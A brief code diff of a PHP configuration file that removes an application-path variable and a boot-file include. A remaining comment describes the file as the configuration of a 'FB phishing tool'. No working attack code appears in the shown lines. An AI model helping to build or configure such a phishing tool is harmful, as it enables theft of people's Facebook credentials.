@@ -1,9 +1,4 @@
 <?php
-// Set SUPER Vars
-$apppath = dirname(__FILE__);
-
-// Require main boot
-require("$apppath/main.boot.php");
 
 // This is the configuration of the FB phishing tool!
 // Here you should define all database connection settings and other stuff
